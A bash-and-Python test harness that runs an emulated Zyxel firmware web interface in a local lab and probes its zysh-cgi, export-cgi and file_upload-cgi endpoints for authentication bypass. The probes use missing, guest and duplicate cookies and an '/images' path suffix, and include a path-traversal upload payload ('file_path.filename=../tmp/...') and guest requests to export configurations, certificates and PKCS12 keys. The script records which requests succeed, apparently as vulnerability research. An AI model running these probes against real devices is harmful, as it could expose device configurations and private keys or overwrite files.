#!/usr/bin/env bash
set -euo pipefail

ROOT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")/.." && pwd)"
source "$ROOT_DIR/tools/zyxel_bwrap_env.sh"
source "$ROOT_DIR/tools/zyxel_manual_core_lane.sh"

RUNROOT="$ROOT_DIR/runroot"
STATE_DIR="$ROOT_DIR/.lab-state"
ARTIFACT_ROOT="$ROOT_DIR/live_artifacts"
LABEL="${1:-web_lane_issue2_alt_20260421a}"
ARTIFACT_DIR="$ARTIFACT_ROOT/$LABEL"
SUMMARY_OUT="$ARTIFACT_DIR/summary.txt"
UPLOAD_SAMPLE="/etc/hosts"

need_cmd() {
  command -v "$1" >/dev/null 2>&1 || {
    echo "Missing dependency: $1" >&2
    exit 1
  }
}

ensure_file() {
  local path="$1"
  [[ -f "$path" ]] || : >"$path"
}

status_from_headers() {
  awk 'NR==1 {print $2}' "$1" 2>/dev/null || true
}

pick_first_basename() {
  local host_dir="$1"
  local fallback="$2"
  if [[ -d "$host_dir" ]]; then
    local picked
    picked="$(find "$host_dir" -maxdepth 1 -type f -printf '%f\n' 2>/dev/null | LC_ALL=C sort | head -n 1 || true)"
    if [[ -n "$picked" ]]; then
      printf '%s\n' "$picked"
    else
      printf '%s\n' "$fallback"
    fi
  else
    printf '%s\n' "$fallback"
  fi
}

stop_lab() {
  zyxel_stop_manual_core_lane
  "$ROOT_DIR/tools/run_zyxel_lab.sh" stop >/dev/null 2>&1 || true
}

start_lane() {
  local lane="$1"
  local user_type="$2"
  local token="$3"
  local lane_dir="$ARTIFACT_DIR/$lane"
  mkdir -p "$lane_dir"
  "$ROOT_DIR/tools/run_zyxel_lab.sh" stop >"$lane_dir/pre_stop.log" 2>&1 || true
  zyxel_start_manual_core_lane "$ROOT_DIR" "$RUNROOT" "$STATE_DIR" "$user_type" "$token" "${LABEL}_${lane}" >"$lane_dir/start_core.log" 2>&1
  cp -f "$STATE_DIR/${LABEL}_${lane}_zyshd_wd.log" "$lane_dir/core_health.log" 2>/dev/null || : >"$lane_dir/core_health.log"
  zyxel_start_manual_lighttpd "$RUNROOT" "$STATE_DIR" "${LABEL}_${lane}" >"$lane_dir/manual_lighttpd.log" 2>&1
  ss -ltnp >"$lane_dir/listeners.txt" 2>&1 || true
  ss -lxnp >"$lane_dir/unix_sockets.txt" 2>&1 || true
  {
    echo "[lighttpd auth_zyxel]"
    sed -n '1,120p' "$RUNROOT/usr/local/lighttpd/conf/conf.d/auth_zyxel.conf" 2>/dev/null || true
    echo
    echo "[zyxel gui httpd]"
    sed -n '1,80p' "$RUNROOT/usr/local/zyxel-gui/httpd.conf" 2>/dev/null || true
  } >"$lane_dir/web_auth_context.txt"
}

finalize_lane() {
  local lane="$1"
  local lane_dir="$ARTIFACT_DIR/$lane"
  cp -f "$STATE_DIR/lighttpd.pid" "$lane_dir/lighttpd.pid" 2>/dev/null || true
  cp -f "$STATE_DIR/${LABEL}_${lane}_lighttpd.log" "$lane_dir/lighttpd.log" 2>/dev/null || cp -f "$STATE_DIR/lighttpd.log" "$lane_dir/lighttpd.log" 2>/dev/null || : >"$lane_dir/lighttpd.log"
  cp -f "$STATE_DIR/${LABEL}_${lane}_uam1.log" "$lane_dir/uam1.log" 2>/dev/null || true
  cp -f "$STATE_DIR/${LABEL}_${lane}_uam2.log" "$lane_dir/uam2.log" 2>/dev/null || true
  cp -f "$STATE_DIR/${LABEL}_${lane}_uam_notify.log" "$lane_dir/uam_notify.log" 2>/dev/null || true
  stop_lab >"$lane_dir/post_stop.log" 2>&1 || true
}

http_request() {
  local out_prefix="$1"
  local method="$2"
  local path="$3"
  local cookie_header="${4:-}"
  shift 4

  local headers_file="${out_prefix}.headers.txt"
  local body_file="${out_prefix}.body.bin"
  local -a curl_args=(
    -sS --max-time 20
    -D "$headers_file"
    -o "$body_file"
    -H 'Host: 127.0.0.1:8080'
    -X "$method"
  )
  if [[ -n "$cookie_header" ]]; then
    curl_args+=(-H "Cookie: $cookie_header")
  fi
  curl_args+=("$@" "http://127.0.0.1:8080${path}")

  curl "${curl_args[@]}" || true
  ensure_file "$headers_file"
  ensure_file "$body_file"
}

snapshot_upload_targets() {
  local outfile="$1"
  local host_src="$2"
  local host_tgt="$3"
  {
    if [[ -f "$host_src" ]]; then
      echo "src_exists=yes"
      echo "src_size=$(wc -c <"$host_src" | tr -d ' ')"
      echo "src_sha256=$(sha256sum "$host_src" | awk '{print $1}')"
    else
      echo "src_exists=no"
    fi
    if [[ -f "$host_tgt" ]]; then
      echo "tgt_exists=yes"
      echo "tgt_size=$(wc -c <"$host_tgt" | tr -d ' ')"
      echo "tgt_sha256=$(sha256sum "$host_tgt" | awk '{print $1}')"
    else
      echo "tgt_exists=no"
    fi
  } >"$outfile"
}

run_file_upload_case() {
  local lane="$1"
  local req_name="$2"
  local cookie_header="$3"
  local path="$4"
  local shape="$5"
  local prefix="$ARTIFACT_DIR/$lane/file_upload/${req_name}"
  local host_src="$RUNROOT/tmp/${req_name}_source.txt"
  local host_tgt="$RUNROOT/tmp/${req_name}_target.txt"
  local src_path="/tmp/${req_name}_source.txt"
  local tgt_path="/tmp/${req_name}_target.txt"

  mkdir -p "$(dirname "$prefix")"
  printf 'issue2-source-%s\n' "$req_name" >"$host_src"
  printf 'issue2-target-%s\n' "$req_name" >"$host_tgt"
  snapshot_upload_targets "${prefix}.before.txt" "$host_src" "$host_tgt"

  case "$shape" in
    get)
      http_request "$prefix" GET "$path" "$cookie_header"
      ;;
    empty_post)
      http_request "$prefix" POST "$path" "$cookie_header"
      ;;
    multipart_config)
      http_request "$prefix" POST "$path" "$cookie_header" \
        -F "file_path=@$UPLOAD_SAMPLE;filename=sample.conf" \
        -F 'file_type=config' \
        -F 'nv=1' \
        -F 'vn=1'
      ;;
    urlencoded_poc)
      http_request "$prefix" POST "$path" "$cookie_header" \
        --data-urlencode "file_path=$src_path" \
        --data-urlencode 'nv=a' \
        --data-urlencode "file_path.length=${#src_path}" \
        --data-urlencode 'file_type=certlocal' \
        --data-urlencode 'vn=b' \
        --data-urlencode "file_path.filename=../tmp/${req_name}_target.txt"
      ;;
    *)
      echo "Unknown file_upload shape: $shape" >&2
      exit 1
      ;;
  esac

  snapshot_upload_targets "${prefix}.after.txt" "$host_src" "$host_tgt"
}

run_export_case() {
  local lane="$1"
  local req_name="$2"
  local cookie_header="$3"
  local path="$4"
  local prefix="$ARTIFACT_DIR/$lane/export/${req_name}"
  mkdir -p "$(dirname "$prefix")"
  http_request "$prefix" GET "$path" "$cookie_header"
}

run_zysh_case() {
  local lane="$1"
  local req_name="$2"
  local cookie_header="$3"
  local path="$4"
  local prefix="$ARTIFACT_DIR/$lane/zysh/${req_name}"
  mkdir -p "$(dirname "$prefix")"
  http_request "$prefix" POST "$path" "$cookie_header" \
    --data 'filter=js2' \
    --data-urlencode 'cmd=show running-config' \
    --data 'write=0'
}

need_cmd bwrap
need_cmd curl
need_cmd python3
need_cmd qemu-aarch64-static
need_cmd rg
need_cmd ss
need_cmd sha256sum

mkdir -p "$ARTIFACT_DIR"
trap stop_lab EXIT

diag_arg="$(pick_first_basename "$RUNROOT/tmp/diag" 'placeholder.bz2')"
packet_trace_arg="$(pick_first_basename "$RUNROOT/etc/zyxel/ftp/packet_trace" 'placeholder.txt')"
script_arg="$(pick_first_basename "$RUNROOT/etc/zyxel/ftp/script" 'placeholder.zysh')"
trusted_cert_arg="$(pick_first_basename "$RUNROOT/etc/zyxel/ftp/cert/trusted" 'default.crt')"

start_lane guest_lane 1 testtoken

run_zysh_case guest_lane nocookie_plain "" '/cgi-bin/zysh-cgi'
run_zysh_case guest_lane guest_plain 'authtok=testtoken' '/cgi-bin/zysh-cgi'
run_zysh_case guest_lane guest_suffix 'authtok=testtoken' '/cgi-bin/zysh-cgi/images'
run_zysh_case guest_lane dup_empty_first 'authtok=; authtok=testtoken' '/cgi-bin/zysh-cgi'
run_zysh_case guest_lane dup_valid_first 'authtok=testtoken; authtok=junk' '/cgi-bin/zysh-cgi'
run_zysh_case guest_lane dup_junk_first 'authtok=junk; authtok=testtoken' '/cgi-bin/zysh-cgi'
run_zysh_case guest_lane qs_valid_only "" '/cgi-bin/zysh-cgi?authtok=testtoken'
run_zysh_case guest_lane qs_valid_cookie_junk 'authtok=junk' '/cgi-bin/zysh-cgi?authtok=testtoken'
run_zysh_case guest_lane qs_junk_cookie_valid 'authtok=testtoken' '/cgi-bin/zysh-cgi?authtok=junk'

run_file_upload_case guest_lane nocookie_get_plain "" '/cgi-bin/file_upload-cgi' get
run_file_upload_case guest_lane nocookie_get_suffix "" '/cgi-bin/file_upload-cgi/images' get
run_file_upload_case guest_lane nocookie_empty_post_plain "" '/cgi-bin/file_upload-cgi' empty_post
run_file_upload_case guest_lane nocookie_empty_post_suffix "" '/cgi-bin/file_upload-cgi/images' empty_post
run_file_upload_case guest_lane nocookie_multipart_plain "" '/cgi-bin/file_upload-cgi' multipart_config
run_file_upload_case guest_lane nocookie_multipart_suffix "" '/cgi-bin/file_upload-cgi/images' multipart_config
run_file_upload_case guest_lane nocookie_poc_plain "" '/cgi-bin/file_upload-cgi' urlencoded_poc
run_file_upload_case guest_lane nocookie_poc_suffix "" '/cgi-bin/file_upload-cgi/images' urlencoded_poc
run_file_upload_case guest_lane guest_poc_plain 'authtok=testtoken' '/cgi-bin/file_upload-cgi' urlencoded_poc
run_file_upload_case guest_lane guest_poc_suffix 'authtok=testtoken' '/cgi-bin/file_upload-cgi/images' urlencoded_poc
run_file_upload_case guest_lane guest_multipart_plain 'authtok=testtoken' '/cgi-bin/file_upload-cgi' multipart_config
run_file_upload_case guest_lane guest_multipart_suffix 'authtok=testtoken' '/cgi-bin/file_upload-cgi/images' multipart_config

run_export_case guest_lane nocookie_config_plain "" '/cgi-bin/export-cgi?category=config&arg0=startup-config.conf'
run_export_case guest_lane nocookie_config_suffix "" '/cgi-bin/export-cgi/images?category=config&arg0=startup-config.conf'
run_export_case guest_lane guest_config_plain 'authtok=testtoken' '/cgi-bin/export-cgi?category=config&arg0=startup-config.conf'
run_export_case guest_lane guest_config_suffix 'authtok=testtoken' '/cgi-bin/export-cgi/images?category=config&arg0=startup-config.conf'
run_export_case guest_lane guest_lastgood_plain 'authtok=testtoken' '/cgi-bin/export-cgi?category=config&arg0=lastgood.conf'
run_export_case guest_lane guest_systemdefault_plain 'authtok=testtoken' '/cgi-bin/export-cgi?category=config&arg0=system-default.conf'
run_export_case guest_lane guest_pkcs12_plain 'authtok=testtoken' '/cgi-bin/export-cgi?category=pkcs12&arg0=default&arg1=testpass'
run_export_case guest_lane guest_cert_plain 'authtok=testtoken' '/cgi-bin/export-cgi?category=cert&arg0=default'
run_export_case guest_lane guest_script_plain 'authtok=testtoken' "/cgi-bin/export-cgi?category=script&arg0=${script_arg}"
run_export_case guest_lane guest_diag_plain 'authtok=testtoken' "/cgi-bin/export-cgi?category=diag&arg0=${diag_arg}"
run_export_case guest_lane guest_pcap_plain 'authtok=testtoken' "/cgi-bin/export-cgi?category=pcap&arg0=${packet_trace_arg}"
run_export_case guest_lane guest_rogue_plain 'authtok=testtoken' '/cgi-bin/export-cgi?category=rogue.aplist&arg0=rogue.txt'
run_export_case guest_lane guest_friendly_plain 'authtok=testtoken' '/cgi-bin/export-cgi?category=friendly.aplist&arg0=friendly.txt'
run_export_case guest_lane guest_systemlog_plain 'authtok=testtoken' '/cgi-bin/export-cgi?category=systemlog&arg0=placeholder.txt'
run_export_case guest_lane guest_diagnostic_info_plain 'authtok=testtoken' '/cgi-bin/export-cgi?category=diagnostic_info&arg0=placeholder.txt'
run_export_case guest_lane guest_packet_trace_plain 'authtok=testtoken' "/cgi-bin/export-cgi?category=packet_trace&arg0=${packet_trace_arg}"
run_export_case guest_lane guest_wireless_dump_plain 'authtok=testtoken' '/cgi-bin/export-cgi?category=wireless.dump&arg0=placeholder.txt'
run_export_case guest_lane guest_coredumpflash_plain 'authtok=testtoken' '/cgi-bin/export-cgi?category=coredumpflash&arg0=placeholder.txt'
run_export_case guest_lane guest_coredumpusb_plain 'authtok=testtoken' '/cgi-bin/export-cgi?category=coredumpusbstorage&arg0=placeholder.txt'

finalize_lane guest_lane

start_lane admin_lane 0 admin0

run_zysh_case admin_lane admin_plain 'authtok=admin0' '/cgi-bin/zysh-cgi'
run_zysh_case admin_lane admin_suffix 'authtok=admin0' '/cgi-bin/zysh-cgi/images'

run_file_upload_case admin_lane admin_poc_plain 'authtok=admin0' '/cgi-bin/file_upload-cgi' urlencoded_poc
run_file_upload_case admin_lane admin_poc_suffix 'authtok=admin0' '/cgi-bin/file_upload-cgi/images' urlencoded_poc
run_file_upload_case admin_lane admin_multipart_plain 'authtok=admin0' '/cgi-bin/file_upload-cgi' multipart_config
run_file_upload_case admin_lane admin_multipart_suffix 'authtok=admin0' '/cgi-bin/file_upload-cgi/images' multipart_config

run_export_case admin_lane admin_config_plain 'authtok=admin0' '/cgi-bin/export-cgi?category=config&arg0=startup-config.conf'
run_export_case admin_lane admin_config_suffix 'authtok=admin0' '/cgi-bin/export-cgi/images?category=config&arg0=startup-config.conf'
run_export_case admin_lane admin_lastgood_plain 'authtok=admin0' '/cgi-bin/export-cgi?category=config&arg0=lastgood.conf'
run_export_case admin_lane admin_systemdefault_plain 'authtok=admin0' '/cgi-bin/export-cgi?category=config&arg0=system-default.conf'
run_export_case admin_lane admin_pkcs12_plain 'authtok=admin0' '/cgi-bin/export-cgi?category=pkcs12&arg0=default&arg1=testpass'
run_export_case admin_lane admin_cert_plain 'authtok=admin0' '/cgi-bin/export-cgi?category=cert&arg0=default'
run_export_case admin_lane admin_trusted_cert_plain 'authtok=admin0' "/cgi-bin/export-cgi?category=cert&arg0=${trusted_cert_arg}"
run_export_case admin_lane admin_script_plain 'authtok=admin0' "/cgi-bin/export-cgi?category=script&arg0=${script_arg}"
run_export_case admin_lane admin_diag_plain 'authtok=admin0' "/cgi-bin/export-cgi?category=diag&arg0=${diag_arg}"
run_export_case admin_lane admin_pcap_plain 'authtok=admin0' "/cgi-bin/export-cgi?category=pcap&arg0=${packet_trace_arg}"
run_export_case admin_lane admin_rogue_plain 'authtok=admin0' '/cgi-bin/export-cgi?category=rogue.aplist&arg0=rogue.txt'
run_export_case admin_lane admin_friendly_plain 'authtok=admin0' '/cgi-bin/export-cgi?category=friendly.aplist&arg0=friendly.txt'
run_export_case admin_lane admin_systemlog_plain 'authtok=admin0' '/cgi-bin/export-cgi?category=systemlog&arg0=placeholder.txt'
run_export_case admin_lane admin_diagnostic_info_plain 'authtok=admin0' '/cgi-bin/export-cgi?category=diagnostic_info&arg0=placeholder.txt'
run_export_case admin_lane admin_packet_trace_plain 'authtok=admin0' "/cgi-bin/export-cgi?category=packet_trace&arg0=${packet_trace_arg}"
run_export_case admin_lane admin_wireless_dump_plain 'authtok=admin0' '/cgi-bin/export-cgi?category=wireless.dump&arg0=placeholder.txt'
run_export_case admin_lane admin_coredumpflash_plain 'authtok=admin0' '/cgi-bin/export-cgi?category=coredumpflash&arg0=placeholder.txt'
run_export_case admin_lane admin_coredumpusb_plain 'authtok=admin0' '/cgi-bin/export-cgi?category=coredumpusbstorage&arg0=placeholder.txt'

finalize_lane admin_lane

python3 - "$ARTIFACT_DIR" "$SUMMARY_OUT" <<'PY'
import re
import sys
from pathlib import Path

root = Path(sys.argv[1])
summary = Path(sys.argv[2])


def parse_status(headers_path: Path) -> str:
    if not headers_path.exists():
        return ""
    line = headers_path.read_text(encoding="utf-8", errors="replace").splitlines()
    if not line:
        return ""
    parts = line[0].split()
    return parts[1] if len(parts) > 1 else ""


def parse_zysh_body(body_path: Path):
    text = body_path.read_text(encoding="utf-8", errors="replace") if body_path.exists() else ""
    usr_type = ""
    data_ready = ""
    if m := re.search(r"var usr_type = (\d+);", text):
        usr_type = m.group(1)
    if m := re.search(r"var data_ready = (\d+);", text):
        data_ready = m.group(1)
    has_config = "yes" if "interface-name ge1 lan1" in text else "no"
    has_priv_fail = "yes" if "% Insufficient privilege" in text else "no"
    return usr_type, data_ready, has_config, has_priv_fail, len(text.encode())


def parse_status_phrase(body_path: Path) -> str:
    if not body_path.exists():
      return ""
    text = body_path.read_text(encoding="utf-8", errors="replace")
    for marker in (
        "Status: 400 Bad Request (invalid user type)",
        "Status: 400 Bad Request (invalid category)",
        "Status: 400 Bad Request (category is missed)",
        "Status: 500 Internal Server Error !",
        "Status: 500 Internal Server Error 2(#666)",
        "Warning ULCGI access denied!",
        "Warning ULCGI file type indication error!",
        "Can't convert config!",
    ):
        if marker in text:
            return marker
    return text[:120].replace("\n", "\\n")


def parse_upload_effect(prefix: Path):
    before = prefix.with_suffix(".before.txt")
    after = prefix.with_suffix(".after.txt")
    if not before.exists() or not after.exists():
        return ""
    def load(path: Path):
        out = {}
        for line in path.read_text(encoding="utf-8", errors="replace").splitlines():
            if "=" in line:
                key, value = line.split("=", 1)
                out[key] = value
        return out
    b = load(before)
    a = load(after)
    changes = []
    for key in ("src_exists", "tgt_exists", "src_sha256", "tgt_sha256"):
        if b.get(key) != a.get(key):
            changes.append(f"{key}:{b.get(key,'')}->{a.get(key,'')}")
    return ",".join(changes) if changes else "none"


def write_tsv(path: Path, rows):
    path.write_text("\n".join("\t".join(row) for row in rows) + "\n", encoding="utf-8")


zysh_rows = [("lane", "request", "http", "usr_type", "data_ready", "has_config", "has_priv_fail", "body_bytes")]
for lane in ("guest_lane", "admin_lane"):
    for headers in sorted((root / lane / "zysh").glob("*.headers.txt")):
        req = headers.name[:-12]
        body = headers.with_name(req + ".body.bin")
        http = parse_status(headers)
        usr_type, data_ready, has_config, has_priv_fail, body_bytes = parse_zysh_body(body)
        zysh_rows.append((lane, req, http, usr_type, data_ready, has_config, has_priv_fail, str(body_bytes)))
write_tsv(root / "zysh_matrix.tsv", zysh_rows)

export_rows = [("lane", "request", "http", "body_bytes", "status_phrase")]
for lane in ("guest_lane", "admin_lane"):
    for headers in sorted((root / lane / "export").glob("*.headers.txt")):
        req = headers.name[:-12]
        body = headers.with_name(req + ".body.bin")
        export_rows.append((
            lane,
            req,
            parse_status(headers),
            str(body.stat().st_size if body.exists() else 0),
            parse_status_phrase(body),
        ))
write_tsv(root / "export_matrix.tsv", export_rows)

upload_rows = [("lane", "request", "http", "body_bytes", "status_phrase", "effect")]
for lane in ("guest_lane", "admin_lane"):
    for headers in sorted((root / lane / "file_upload").glob("*.headers.txt")):
        req = headers.name[:-12]
        prefix = headers.with_name(req)
        body = headers.with_name(req + ".body.bin")
        upload_rows.append((
            lane,
            req,
            parse_status(headers),
            str(body.stat().st_size if body.exists() else 0),
            parse_status_phrase(body),
            parse_upload_effect(prefix),
        ))
write_tsv(root / "file_upload_matrix.tsv", upload_rows)

guest_zysh = [row for row in zysh_rows[1:] if row[0] == "guest_lane"]
interesting_zysh = [row for row in guest_zysh if row[5] == "yes" or row[3] not in ("", "1") or row[2] == "200" and row[6] == "no"]
guest_export = [row for row in export_rows[1:] if row[0] == "guest_lane" and row[1].startswith("guest_")]
nocookie_export = [row for row in export_rows[1:] if row[0] == "guest_lane" and row[1].startswith("nocookie_")]
admin_export = [row for row in export_rows[1:] if row[0] == "admin_lane"]
guest_upload = [row for row in upload_rows[1:] if row[0] == "guest_lane" and row[1].startswith("guest_")]
nocookie_upload = [row for row in upload_rows[1:] if row[0] == "guest_lane" and row[1].startswith("nocookie_")]
admin_upload = [row for row in upload_rows[1:] if row[0] == "admin_lane"]

guest_export_hits = [row for row in guest_export if row[2] == "200"]
nocookie_export_hits = [row for row in nocookie_export if row[2] == "200"]
guest_upload_effects = [row for row in guest_upload if row[5] != "none"]
nocookie_upload_effects = [row for row in nocookie_upload if row[5] != "none"]
admin_upload_effects = [row for row in admin_upload if row[5] != "none"]

listeners = (root / "guest_lane" / "listeners.txt").read_text(encoding="utf-8", errors="replace") if (root / "guest_lane" / "listeners.txt").exists() else ""
has_alt_listener = "yes" if any((":80 " in line or ":443 " in line or ":8008 " in line or ":10443 " in line or ":10444 " in line) for line in listeners.splitlines()) else "no"

lines = [
    "result_class=web_lane_issue2_alternative_probe",
    "date=2026-04-21",
    f"guest_export_http200_count={len(guest_export_hits)}",
    f"nocookie_export_http200_count={len(nocookie_export_hits)}",
    f"guest_upload_effect_count={len(guest_upload_effects)}",
    f"nocookie_upload_effect_count={len(nocookie_upload_effects)}",
    f"admin_upload_effect_count={len(admin_upload_effects)}",
    f"interesting_guest_zysh_count={len(interesting_zysh)}",
    f"alternate_listener_seen={has_alt_listener}",
    "",
    "[zysh-cgi session confusion]",
]

if interesting_zysh:
    for row in interesting_zysh:
        lines.append(f"- {row[1]} => http={row[2]} usr_type={row[3]} data_ready={row[4]} has_config={row[5]} priv_fail={row[6]}")
else:
    lines.append("- All tested guest/no-cookie/query-string/duplicate-cookie variants stay on the known boundary: no config body and no guest-to-admin usr_type shift.")

lines.extend([
    "",
    "[export-cgi matrix]",
    "- Guest/no-cookie results are preserved in export_matrix.tsv.",
    "- Admin controls are preserved in export_matrix.tsv for the same categories.",
])
if guest_export_hits or nocookie_export_hits:
    for row in guest_export_hits + nocookie_export_hits:
        lines.append(f"- Potential guest/no-cookie export hit: {row[1]} => http={row[2]} bytes={row[3]} phrase={row[4]}")
else:
    lines.append("- No guest or no-cookie export request returned HTTP 200 in this pass.")

admin_config = next((row for row in admin_export if row[1] == "admin_config_plain"), None)
admin_pkcs12 = next((row for row in admin_export if row[1] == "admin_pkcs12_plain"), None)
if admin_config:
    lines.append(f"- Admin control admin_config_plain => http={admin_config[2]} bytes={admin_config[3]}")
if admin_pkcs12:
    lines.append(f"- Admin control admin_pkcs12_plain => http={admin_pkcs12[2]} bytes={admin_pkcs12[3]}")

lines.extend([
    "",
    "[file_upload-cgi /images branch]",
    "- The exact public form-urlencoded shape and the existing multipart control are preserved in file_upload_matrix.tsv.",
])
if guest_upload_effects or nocookie_upload_effects:
    for row in guest_upload_effects + nocookie_upload_effects:
        lines.append(f"- Potential guest/no-cookie file effect: {row[1]} => http={row[2]} effect={row[5]} phrase={row[4]}")
else:
    lines.append("- No guest or no-cookie file_upload request changed the disposable /tmp source or target files.")
if admin_upload_effects:
    for row in admin_upload_effects:
        lines.append(f"- Admin file_upload effect: {row[1]} => http={row[2]} effect={row[5]} phrase={row[4]}")

lines.extend([
    "",
    "[bounded alternate-host scan]",
    "- Listener scan for the guest lane is preserved in guest_lane/listeners.txt.",
    f"- Alternate management-style listeners beyond the lab lighttpd port were detected: {has_alt_listener}.",
    "",
    "[artifacts]",
    f"- {root / 'zysh_matrix.tsv'}",
    f"- {root / 'export_matrix.tsv'}",
    f"- {root / 'file_upload_matrix.tsv'}",
    f"- {root / 'guest_lane'}",
    f"- {root / 'admin_lane'}",
])

summary.write_text("\n".join(lines) + "\n", encoding="utf-8")
PY

printf 'Summary: %s\n' "$SUMMARY_OUT"
